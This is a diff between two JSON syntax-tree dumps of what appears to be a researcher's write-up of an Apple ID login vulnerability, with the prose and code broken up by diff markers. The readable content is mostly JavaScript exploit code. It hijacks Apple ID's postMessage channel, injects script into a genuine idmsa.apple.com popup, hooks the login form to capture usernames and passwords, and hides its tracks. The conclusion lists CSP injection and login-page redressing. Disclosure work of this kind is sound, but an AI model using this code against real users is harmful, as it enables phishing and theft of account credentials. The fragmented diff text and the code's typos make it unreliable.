it\n    // is ... not entirely kosher but it works for our\n    // purposes.\n    if (e.data == \"ready\") return nullPage.postMessage(config, \"*\");\n\n    // the postmessage JSONRPC protocol that apple id uses\n    // prefixes everything with this string. We need to trim\n    // it off, but also do this ourselves in our communications.\n    const prefix = \"pmrpc.\";\n\n    if (!e.data.startsWith(prefix))\n        throw new Error(`got weird message ${JSON.strigify(data)}`);\n\n    // I'm sure there's a real trimPrefix function somewhere\n    // but i'm not in the business of following the rules\n    // right now.\n    const json = e.data.slice(prefix.length);\n\n    const rq = JSON.parse(json);\n\n    // extracting the stuff from the request that will be reused\n    // for our response.\n    const { method, jsonrpc, params , id } = rq;\n\n    // share the good news when we steal your apple login\n    if (method == \"passwordAuthDone\") alert(`got creds! ${\n        JSON.stringify(params)\n    }`);\n\n    // same if we also get a 2FA'd set of creds\n    if (method == \"complete\") alert(`got creds! ${\n        JSON.stringify(params)\n    }`);\n\n    // config requests are the complicated ones.\n    // we merge our template with the jsonrpc version\n    // and the request id for our response.\n    if (method == \"config\") return nullPage.postMessage(\n        `${prefix}${JSON.stringify({\n            ...config_resp, jsonrpc, id\n        })}`, \"*\";\n    )\n\n    // for all other requests, we just let the page know\n    // that everything is OK ;)\n    nullPage.postMessage(`${prefix}${JSON.stringify({\n        jsonrpc, id, result: true\n    })}`, \"*\");\n})\n\n// prepare the config to send to the null page\nconst config = {\n    idmsaFrameId,\n    type: \"config\"\n}\n</script>",
<       "position": {
<         "start": {
<           "line": 1159,
<           "column": 1,
<           "offset": 60977
<         },
<         "end": {
<           "line": 1448,
<           "column": 4,
<           "offset": 71486
<         },
<         "indent": [
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "That about covers the basics of how our vulnerability works. We need to do one more thing to truly 'steal the bank', though. We need to escape into an ",
<           "position": {
<             "start": {
<               "line": 1450,
<               "column": 1,
<               "offset": 71490
<             },
<             "end": {
<               "line": 1450,
<               "column": 152,
<               "offset": 71641
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "idmsa.apple.com",
<           "position": {
<             "start": {
<               "line": 1450,
<               "column": 152,
<               "offset": 71641
<             },
<             "end": {
<               "line": 1450,
<               "column": 169,
<               "offset": 71658
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " popup once our attack succeeds. Partially so it's harder to trace us, but also because having ",
<           "position": {
<             "start": {
<               "line": 1450,
<               "column": 169,
<               "offset": 71658
<             },
<             "end": {
<               "line": 1450,
<               "column": 264,
<               "offset": 71753
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "idmsa.apple.com",
<           "position": {
<             "start": {
<               "line": 1450,
<               "column": 264,
<               "offset": 71753
<             },
<             "end": {
<               "line": 1450,
<               "column": 281,
<               "offset": 71770
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " in the url bar makes it impossible for even the most paranoid to suspect something awry. This makes our ",
<           "position": {
<             "start": {
<               "line": 1450,
<               "column": 281,
<               "offset": 71770
<             },
<             "end": {
<               "line": 1450,
<               "column": 386,
<               "offset": 71875
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "injection",
<           "position": {
<             "start": {
<               "line": 1450,
<               "column": 386,
<               "offset": 71875
<             },
<             "end": {
<               "line": 1450,
<               "column": 397,
<               "offset": 71886
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " function a bit more complicated.",
<           "position": {
<             "start": {
<               "line": 1450,
<               "column": 397,
<               "offset": 71886
<             },
<             "end": {
<               "line": 1450,
<               "column": 430,
<               "offset": 71919
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 1450,
<           "column": 1,
<           "offset": 71490
<         },
<         "end": {
<           "line": 1450,
<           "column": 430,
<           "offset": 71919
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "Warning: this code is really hacky.",
<           "position": {
<             "start": {
<               "line": 1452,
<               "column": 1,
<               "offset": 71923
<             },
<             "end": {
<               "line": 1452,
<               "column": 36,
<               "offset": 71958
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 1452,
<           "column": 1,
<           "offset": 71923
<         },
<         "end": {
<           "line": 1452,
<           "column": 36,
<           "offset": 71958
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "code",
<       "lang": "javascript",
<       "meta": null,
<       "value": "const injection = () => {\n\n    // we want to get rid of the evidence as soon as we can.\n    // once our popup is initialized, it passes us a message\n    // which we then pass onto our parent exploit window.\n    // it can then use location.assign() to remove us\n    // from the browser history.\n    window.addEventListener(\"message\", ({data}) => {\n    if(data != \"CLOSE\") return;\n        window.parent.postMessage(\"CLOSE\", \"*\");\n        window.close();\n    })\n\n\n    // the 'Sign in With Apple' button, stolen right from\n    // the brand guidelines\n    const appleLoginImage = \"https://developer.apple.com/design/human-interface-guidelines/sign-in-with-apple/images/apple-id-sign-in-with.png\";\n\n    // This is a legitimate apple login page.\n    // we pop this out and escape into it.\n    const legitLogin = \"https://idmsa.apple.com/IDMSWebAuth/login.html?appIdKey=49bd208126787c17c33ca3b14d2a4f0c92daa10c417c4d686140e4acc04ba5f4&language=US-EN&path=/Login.do%3FmyInfoReturnURL%3DRegisterAgreement.do%253Fskip%253Dyes%253Fskip%253Dyes\";\n\n    // create the 'Signi in With Apple' button.\n    const i = document.createElement(\"img\");\n    i.src= appleLoginImage;\n\n    // when the button is clicked, we popout our\n    // 'legit' login page.\n    //\n    // A click is needed due to anti-popup browser measures.\n    // we could equally use another input like pressing a key,\n    // but this I think arouses the least suspiscion.\n    i.addEventListener('click', () => {\n    const myWnd = window.open(legitLogin);\n\n    // once we've opened the legit login page, we won't\n    // know when it's actually ready to inject into.\n    // so we just keep injecting over and over again\n    // every tenth of a second until we get a signal\n    // back to say the injection succeedd.\n    setInterval(() => {\n        // injecting code across windows and origins like this\n        // is *really* annoying. unless you've done it before\n        // the full scope of annoyance will be blissfully unknown\n        // to you.\n        //\n        // Because of the way Javascript internals work, each `window`\n        // is its own namespace, so when we document.createElement --\n        // which is secretly window.document.createElement,\n        // we actually make an element that's specific to our\n        // window.\n        //\n        // This fuckery is beyond us at this point\n        // so it's easiest to just inject scripts and have\n        // them run natively in the attacked window.\n        const toInject = () => {\n        \n        // A nice little touch :)\n        document.querySelector(\"#signin\").innerHTML = document.querySelector(\"#signin\").innerHTML.replace(/Apple Support/g, \"your free iPhone\");\n        document.querySelector(\"form[name=form1]\").setAttribute(\"onsubmit\", \"\");\n\n        // override the submit action for the form\n        // to steal the user's username and password.\n        document.querySelector(\"form[name=form1]\").addEventListener('submit',() => {\n            alert(`${\n            document.querySelector(\"#accountname\").value\n            } / ${\n            document.querySelector(\"#accountpassword\").value\n            }`);\n        });\n\n        // once initialized, post to the page that created\n        // us that it can close now.\n        window.opener.postMessage(\"CLOSE\", \"*\");\n        }\n\n        // get a reference to the document of the popped out\n        // window and inject the attack code we just defined.\n        const doc = myWnd.document;\n        const s = (doc.body || doc.documentElement).appendChild(\n        doc.createElement.call(doc, \"script\")\n        );\n        s.innerHTML = `(${toInject})()`;\n    }, 100);\n    });\n\n    // this is awful. do not do this.\n    // it's a really quick way to clear a page of content though :)\n    document.body.innerHTML = \"\";\n\n    // and finally, add the button which will kick it all off\n    document.body.appendChild(i);\n}",
<       "position": {
<         "start": {
<           "line": 1454,
<           "column": 1,
<           "offset": 71962
<         },
<         "end": {
<           "line": 1548,
<           "column": 4,
<           "offset": 75955
<         },
<         "indent": [
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "We also make this minor change to our 'message' listener to destroy ourselves after the attack completes:",
<           "position": {
<             "start": {
<               "line": 1550,
<               "column": 1,
<               "offset": 75959
<             },
<             "end": {
<               "line": 1550,
<               "column": 106,
<               "offset": 76064
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 1550,
<           "column": 1,
<           "offset": 75959
<         },
<         "end": {
<           "line": 1550,
<           "column": 106,
<           "offset": 76064
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "code",
<       "lang": "javascript",
<       "meta": null,
<       "value": "      if (e.data == \"CLOSE\") window.location.replace(\"https://apple.com\")",
<       "position": {
<         "start": {
<           "line": 1552,
<           "column": 1,
<           "offset": 76068
<         },
<         "end": {
<           "line": 1554,
<           "column": 4,
<           "offset": 76161
<         },
<         "indent": [
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "heading",
<       "depth": 2,
<       "children": [
<         {
<           "type": "text",
<           "value": "Conclusion",
<           "position": {
<             "start": {
<               "line": 1556,
<               "column": 1,
<               "offset": 76165
<             },
<             "end": {
<               "line": 1556,
<               "column": 11,
<               "offset": 76175
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 1556,
<           "column": 1,
<           "offset": 76165
<         },
<         "end": {
<           "line": 1557,
<           "column": 11,
<           "offset": 76187
<         },
<         "indent": [
<           1
<         ]
<       }
<     },
<     {
<       "type": "definition",
<       "identifier": "conclusion",
<       "label": "Conclusion",
<       "title": null,
<       "url": "#conclusion",
<       "position": {
<         "start": {
<           "line": 1558,
<           "column": 1,
<           "offset": 76189
<         },
<         "end": {
<           "line": 1558,
<           "column": 26,
<           "offset": 76214
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "definition",
<       "identifier": "§10",
<       "label": "§10",
<       "title": null,
<       "url": "#conclusion",
<       "position": {
<         "start": {
<           "line": 1559,
<           "column": 1,
<           "offset": 76216
<         },
<         "end": {
<           "line": 1559,
<           "column": 19,
<           "offset": 76234
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "We've done a ton of work. What has it gained us? Power. Fame. Strength. Everything a hero needs.",
<           "position": {
<             "start": {
<               "line": 1561,
<               "column": 1,
<               "offset": 76238
<             },
<             "end": {
<               "line": 1561,
<               "column": 97,
<               "offset": 76334
<             },
<             "indent": []
---
>           "data": {
>             "hName": "section"
22176,22182d22162
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 1561,
<           "column": 1,
<           "offset": 76238
22184,22197d22163
<         "end": {
<           "line": 1561,
<           "column": 97,
<           "offset": 76334
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "list",
<       "ordered": true,
<       "start": 1,
<       "spread": false,
<       "children": [
22199,22201c22165,22166
<           "type": "listItem",
<           "spread": false,
<           "checked": null,
---
>           "type": "section",
>           "depth": 2,
22204c22169,22170
<               "type": "paragraph",
---
>               "type": "heading",
>               "depth": 2,
22208c22174
<                   "value": "Content Security Policy injection (",
---
>                   "value": "Conclusion",
22211,22213c22177,22179
<                       "line": 1563,
<                       "column": 4,
<                       "offset": 76341
---
>                       "line": 1556,
>                       "column": 1,
>                       "offset": 76165
22216,22218c22182,22184
<                       "line": 1563,
<                       "column": 39,
<                       "offset": 76376
---
>                       "line": 1556,
>                       "column": 11,
>                       "offset": 76175
22221a22188,22194
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 1556,
>                   "column": 1,
>                   "offset": 76165
22223,22259c22196,22241
<                 {
<                   "type": "linkReference",
<                   "identifier": "§3",
<                   "label": "§3",
<                   "referenceType": "shortcut",
<                   "children": [
<                     {
<                       "type": "text",
<                       "value": "§3",
<                       "position": {
<                         "start": {
<                           "line": 1563,
<                           "column": 40,
<                           "offset": 76377
<                         },
<                         "end": {
<                           "line": 1563,
<                           "column": 42,
<                           "offset": 76379
<                         },
<                         "indent": []
<                       }
<                     }
<                   ],
<                   "position": {
<                     "start": {
<                       "line": 1563,
<                       "column": 39,
<                       "offset": 76376
<                     },
<                     "end": {
<                       "line": 1563,
<                       "column": 43,
<                       "offset": 76380
<                     },
<                     "indent": []
<                   }
---
>                 "end": {
>                   "line": 1557,
>                   "column": 11,
>                   "offset": 76187
>                 },
>                 "indent": [
>                   1
>                 ]
>               }
>             },
>             {
>               "type": "definition",
>               "identifier": "conclusion",
>               "label": "Conclusion",
>               "title": null,
>               "url": "#conclusion",
>               "position": {
>                 "start": {
>                   "line": 1558,
>                   "column": 1,
>                   "offset": 76189
>                 },
>                 "end": {
>                   "line": 1558,
>                   "column": 26,
>                   "offset": 76214
>                 },
>                 "indent": []
>               }
>             },
>             {
>               "type": "definition",
>               "identifier": "§10",
>               "label": "§10",
>               "title": null,
>               "url": "#conclusion",
>               "position": {
>                 "start": {
>                   "line": 1559,
>                   "column": 1,
>                   "offset": 76216
>                 },
>                 "end": {
>                   "line": 1559,
>                   "column": 19,
>                   "offset": 76234
22260a22243,22248
>                 "indent": []
>               }
>             },
>             {
>               "type": "paragraph",
>               "children": [
22263c22251
<                   "value": ")",
---
>                   "value": "We've done a ton of work. What has it gained us? Power. Fame. Strength. Everything a hero needs.",
22266,22268c22254,22256
<                       "line": 1563,
<                       "column": 43,
<                       "offset": 76380
---
>                       "line": 1561,
>                       "column": 1,
>                       "offset": 76238
22271,22273c22259,22261
<                       "line": 1563,
<                       "column": 44,
<                       "offset": 76381
---
>                       "line": 1561,
>                       "column": 97,
>                       "offset": 76334
22281,22283c22269,22271
<                   "line": 1563,
<                   "column": 4,
<                   "offset": 76341
---
>                   "line": 1561,
>                   "column": 1,
>                   "offset": 76238
22286,22288c22274,22276
<                   "line": 1563,
<                   "column": 44,
<                   "offset": 76381
---
>                   "line": 1561,
>                   "column": 97,
>                   "offset": 76334
22295,22296c22283,22284
<               "ordered": false,
<               "start": null,
---
>               "ordered": true,
>               "start": 1,
22309c22297
<                           "value": "Remove any / call Content Security Policy controls preventing cross-site scripting attacks",
---
>                           "value": "Content Security Policy injection (",
22312,22314c22300,22302
<                               "line": 1564,
<                               "column": 6,
<                               "offset": 76388
---
>                               "line": 1563,
>                               "column": 4,
>                               "offset": 76341
22317,22319c22305,22307
<                               "line": 1564,
<                               "column": 96,
<                               "offset": 76478
---
>                               "line": 1563,
>                               "column": 39,
>                               "offset": 76376
22323,22329d22310
<                         }
<                       ],
<                       "position": {
<                         "start": {
<                           "line": 1564,
<                           "column": 6,
<                           "offset": 76388
22331,22334c22312,22348
<                         "end": {
<                           "line": 1564,
<                           "column": 96,
<                           "offset": 76478
---
>                         {
>                           "type": "linkReference",
>                           "identifier": "§3",
>                           "label": "§3",
>                           "referenceType": "shortcut",
>                           "children": [
>                             {
>                               "type": "text",
>                               "value": "§3",
>                               "position": {
>                                 "start": {
>                                   "line": 1563,
>                                   "column": 40,
>                                   "offset": 76377
>                                 },
>                                 "end": {
>                                   "line": 1563,
>                                   "column": 42,
>                                   "offset": 76379
>                                 },
>                                 "indent": []
>                               }
>                             }
>                           ],
>                           "position": {
>                             "start": {
>                               "line": 1563,
>                               "column": 39,
>                               "offset": 76376
>                             },
>                             "end": {
>                               "line": 1563,
>                               "column": 43,
>                               "offset": 76380
>                             },
>                             "indent": []
>                           }
22336,22361d22349
<                         "indent": []
<                       }
<                     }
<                   ],
<                   "position": {
<                     "start": {
<                       "line": 1564,
<                       "column": 4,
<                       "offset": 76386
<                     },
<                     "end": {
<                       "line": 1564,
<                       "column": 96,
<                       "offset": 76478
<                     },
<                     "indent": []
<                   }
<                 },
<                 {
<                   "type": "listItem",
<                   "spread": false,
<                   "checked": null,
<                   "children": [
<                     {
<                       "type": "paragraph",
<                       "children": [
22364c22352
<                           "value": "Remove / replace ",
---
>                           "value": ")",
22367,22369c22355,22357
<                               "line": 1565,
<                               "column": 6,
<                               "offset": 76485
---
>                               "line": 1563,
>                               "column": 43,
>                               "offset": 76380
22372,22374c22360,22362
<                               "line": 1565,
<                               "column": 23,
<                               "offset": 76502
---
>                               "line": 1563,
>                               "column": 44,
>                               "offset": 76381
22377a22366,22377
>                         }
>                       ],
>                       "position": {
>                         "start": {
>                           "line": 1563,
>                           "column": 4,
>                           "offset": 76341
>                         },
>                         "end": {
>                           "line": 1563,
>                           "column": 44,
>                           "offset": 76381
22378a22379,22387
>                         "indent": []
>                       }
>                     },
>                     {
>                       "type": "list",
>                       "ordered": false,
>                       "start": null,
>                       "spread": false,
>                       "children": [
22380,22381c22389,22428
<                           "type": "inlineCode",
<                           "value": "frame-ancestors",
---
>                           "type": "listItem",
>                           "spread": false,
>                           "checked": null,
>                           "children": [
>                             {
>                               "type": "paragraph",
>                               "children": [
>                                 {
>                                   "type": "text",
>                                   "value": "Remove any / call Content Security Policy controls preventing cross-site scripting attacks",
>                                   "position": {
>                                     "start": {
>                                       "line": 1564,
>                                       "column": 6,
>                                       "offset": 76388
>                                     },
>                                     "end": {
>                                       "line": 1564,
>                                       "column": 96,
>                                       "offset": 76478
>                                     },
>                                     "indent": []
>                                   }
>                                 }
>                               ],
>                               "position": {
>                                 "start": {
>                                   "line": 1564,
>                                   "column": 6,
>                                   "offset": 76388
>                                 },
>                                 "end": {
>                                   "line": 1564,
>                                   "column": 96,
>                                   "offset": 76478
>                                 },
>                                 "indent": []
>                               }
>                             }
>                           ],
22384,22386c22431,22433
<                               "line": 1565,
<                               "column": 23,
<                               "offset": 76502
---
>                               "line": 1564,
>                               "column": 4,
>                               "offset": 76386
22389,22391c22436,22438
<                               "line": 1565,
<                               "column": 40,
<                               "offset": 76519
---
>                               "line": 1564,
>                               "column": 96,
>                               "offset": 76478
22397,22398c22444,22517
<                           "type": "text",
<                           "value": " directives, allowing us to embed the Apple ID login wherever we want.  ",
---
>                           "type": "listItem",
>                           "spread": false,
>                           "checked": null,
>                           "children": [
>                             {
>                               "type": "paragraph",
>                               "children": [
>                                 {
>                                   "type": "text",
>                                   "value": "Remove / replace ",
>                                   "position": {
>                                     "start": {
>                                       "line": 1565,
>                                       "column": 6,
>                                       "offset": 76485
>                                     },
>                                     "end": {
>                                       "line": 1565,
>                                       "column": 23,
>                                       "offset": 76502
>                                     },
>                                     "indent": []
>                                   }
>                                 },
>                                 {
>                                   "type": "inlineCode",
>                                   "value": "frame-ancestors",
>                                   "position": {
>                                     "start": {
>                                       "line": 1565,
>                                       "column": 23,
>                                       "offset": 76502
>                                     },
>                                     "end": {
>                                       "line": 1565,
>                                       "column": 40,
>                                       "offset": 76519
>                                     },
>                                     "indent": []
>                                   }
>                                 },
>                                 {
>                                   "type": "text",
>                                   "value": " directives, allowing us to embed the Apple ID login wherever we want.  ",
>                                   "position": {
>                                     "start": {
>                                       "line": 1565,
>                                       "column": 40,
>                                       "offset": 76519
>                                     },
>                                     "end": {
>                                       "line": 1565,
>                                       "column": 112,
>                                       "offset": 76591
>                                     },
>                                     "indent": []
>                                   }
>                                 }
>                               ],
>                               "position": {
>                                 "start": {
>                                   "line": 1565,
>                                   "column": 6,
>                                   "offset": 76485
>                                 },
>                                 "end": {
>                                   "line": 1565,
>                                   "column": 112,
>                                   "offset": 76591
>                                 },
>                                 "indent": []
>                               }
>                             }
>                           ],
22402,22403c22521,22522
<                               "column": 40,
<                               "offset": 76519
---
>                               "column": 4,
>                               "offset": 76483
22412,22423d22530
<                         }
<                       ],
<                       "position": {
<                         "start": {
<                           "line": 1565,
<                           "column": 6,
<                           "offset": 76485
<                         },
<                         "end": {
<                           "line": 1565,
<                           "column": 112,
<                           "offset": 76591
22425,22450d22531
<                         "indent": []
<                       }
<                     }
<                   ],
<                   "position": {
<                     "start": {
<                       "line": 1565,
<                       "column": 4,
<                       "offset": 76483
<                     },
<                     "end": {
<                       "line": 1565,
<                       "column": 112,
<                       "offset": 76591
<                     },
<                     "indent": []
<                   }
<                 },
<                 {
<                   "type": "listItem",
<                   "spread": false,
<                   "checked": null,
<                   "children": [
<                     {
<                       "type": "paragraph",
<                       "children": [
22452,22453c22533,22572
<                           "type": "text",
<                           "value": "Leverage existing information this page has such as the user email",
---
>                           "type": "listItem",
>                           "spread": false,
>                           "checked": null,
>                           "children": [
>                             {
>                               "type": "paragraph",
>                               "children": [
>                                 {
>                                   "type": "text",
>                                   "value": "Leverage existing information this page has such as the user email",
>                                   "position": {
>                                     "start": {
>                                       "line": 1566,
>                                       "column": 6,
>                                       "offset": 76598
>                                     },
>                                     "end": {
>                                       "line": 1566,
>                                       "column": 72,
>                                       "offset": 76664
>                                     },
>                                     "indent": []
>                                   }
>                                 }
>                               ],
>                               "position": {
>                                 "start": {
>                                   "line": 1566,
>                                   "column": 6,
>                                   "offset": 76598
>                                 },
>                                 "end": {
>                                   "line": 1566,
>                                   "column": 72,
>                                   "offset": 76664
>                                 },
>                                 "indent": []
>                               }
>                             }
>                           ],
22457,22458c22576,22577
<                               "column": 6,
<                               "offset": 76598
---
>                               "column": 4,
>                               "offset": 76596
22467,22478d22585
<                         }
<                       ],
<                       "position": {
<                         "start": {
<                           "line": 1566,
<                           "column": 6,
<                           "offset": 76598
<                         },
<                         "end": {
<                           "line": 1566,
<                           "column": 72,
<                           "offset": 76664
22480,22505d22586
<                         "indent": []
<                       }
<                     }
<                   ],
<                   "position": {
<                     "start": {
<                       "line": 1566,
<                       "column": 4,
<                       "offset": 76596
<                     },
<                     "end": {
<                       "line": 1566,
<                       "column": 72,
<                       "offset": 76664
<                     },
<                     "indent": []
<                   }
<                 },
<                 {
<                   "type": "listItem",
<                   "spread": false,
<                   "checked": null,
<                   "children": [
<                     {
<                       "type": "paragraph",
<                       "children": [
22507,22508c22588,22627
<                           "type": "text",
<                           "value": "Arbitrarily redress the Apple ID login page, for example covering the password input with our own, stealing the user's password.",
---
>                           "type": "listItem",
>                           "spread": false,
>                           "checked": null,
>                           "children": [
>                             {
>                               "type": "paragraph",
>                               "children": [
>                                 {
>                                   "type": "text",
>                                   "value": "Arbitrarily redress the Apple ID login page, for example covering the password input with our own, stealing the user's password.",
>                                   "position": {
>                                     "start": {
>                                       "line": 1567,
>                                       "column": 6,
>                                       "offset": 76671
>                                     },
>                                     "end": {
>                                       "line": 1567,
>                                       "column": 134,
>                                       "offset": 76799
>                                     },
>                                     "indent": []
>                                   }
>                                 }
>                               ],
>                               "position": {
>                                 "start": {
>                                   "line": 1567,
>                                   "column": 6,
>                                   "offset": 76671
>                                 },
>                                 "end": {
>                                   "line": 1567,
>                                   "column": 134,
>                                   "offset": 76799
>                                 },
>                                 "indent": []
>                               }
>                             }
>                           ],
22512,22513c22631,22632
<                               "column": 6,
<                               "offset": 76671
---
>                               "column": 4,
>                               "offset": 76669
22526,22528c22645,22647
<                           "line": 1567,
<                           "column": 6,
<                           "offset": 76671
---
>                           "line": 1564,
>                           "column": 4,
>                           "offset": 76386
22535c22654,22658
<                         "indent": []
---
>                         "indent": [
>                           4,
>                           4,
>                           4
>                         ]
22541,22543c22664,22666
<                       "line": 1567,
<                       "column": 4,
<                       "offset": 76669
---
>                       "line": 1563,
>                       "column": 1,
>                       "offset": 76338
22550,22686c22673,22678
<                     "indent": []
<                   }
<                 }
<               ],
<               "position": {
<                 "start": {
<                   "line": 1564,
<                   "column": 4,
<                   "offset": 76386
<                 },
<                 "end": {
<                   "line": 1567,
<                   "column": 134,
<                   "offset": 76799
<                 },
<                 "indent": [
<                   4,
<                   4,
<                   4
<                 ]
<               }
<             }
<           ],
<           "position": {
<             "start": {
<               "line": 1563,
<               "column": 1,
<               "offset": 76338
<             },
<             "end": {
<               "line": 1567,
<               "column": 134,
<               "offset": 76799
<             },
<             "indent": [
<               1,
<               1,
<               1,
<               1
<             ]
<           }
<         },
<         {
<           "type": "listItem",
<           "spread": false,
<           "checked": null,
<           "children": [
<             {
<               "type": "paragraph",
<               "children": [
<                 {
<                   "type": "inlineCode",
<                   "value": "postMessage",
<                   "position": {
<                     "start": {
<                       "line": 1568,
<                       "column": 4,
<                       "offset": 76804
<                     },
<                     "end": {
<                       "line": 1568,
<                       "column": 17,
<                       "offset": 76817
<                     },
<                     "indent": []
<                   }
<                 },
<                 {
<                   "type": "text",
<                   "value": ", send access control list bypass (",
<                   "position": {
<                     "start": {
<                       "line": 1568,
<                       "column": 17,
<                       "offset": 76817
<                     },
<                     "end": {
<                       "line": 1568,
<                       "column": 52,
<                       "offset": 76852
<                     },
<                     "indent": []
<                   }
<                 },
<                 {
<                   "type": "linkReference",
<                   "identifier": "§7",
<                   "label": "§7",
<                   "referenceType": "shortcut",
<                   "children": [
<                     {
<                       "type": "text",
<                       "value": "§7",
<                       "position": {
<                         "start": {
<                           "line": 1568,
<                           "column": 53,
<                           "offset": 76853
<                         },
<                         "end": {
<                           "line": 1568,
<                           "column": 55,
<                           "offset": 76855
<                         },
<                         "indent": []
<                       }
<                     }
<                   ],
<                   "position": {
<                     "start": {
<                       "line": 1568,
<                       "column": 52,
<                       "offset": 76852
<                     },
<                     "end": {
<                       "line": 1568,
<                       "column": 56,
<                       "offset": 76856
<                     },
<                     "indent": []
<                   }
<                 },
<                 {
<                   "type": "text",
<                   "value": ")",
<                   "position": {
<                     "start": {
<                       "line": 1568,
<                       "column": 56,
<                       "offset": 76856
<                     },
<                     "end": {
<                       "line": 1568,
<                       "column": 57,
<                       "offset": 76857
<                     },
<                     "indent": []
---
>                     "indent": [
>                       1,
>                       1,
>                       1,
>                       1
>                     ]
22688,22699d22679
<                 }
<               ],
<               "position": {
<                 "start": {
<                   "line": 1568,
<                   "column": 4,
<                   "offset": 76804
<                 },
<                 "end": {
<                   "line": 1568,
<                   "column": 57,
<                   "offset": 76857
22701,22709d22680
<                 "indent": []
<               }
<             },
<             {
<               "type": "list",
<               "ordered": false,
<               "start": null,
<               "spread": false,
<               "children": [
22719,22720c22690,22691
<                           "type": "text",
<                           "value": "Push information across the origin trust boundary.",
---
>                           "type": "inlineCode",
>                           "value": "postMessage",
22723,22725c22694,22696
<                               "line": 1569,
<                               "column": 6,
<                               "offset": 76864
---
>                               "line": 1568,
>                               "column": 4,
>                               "offset": 76804
22728,22730c22699,22701
<                               "line": 1569,
<                               "column": 56,
<                               "offset": 76914
---
>                               "line": 1568,
>                               "column": 17,
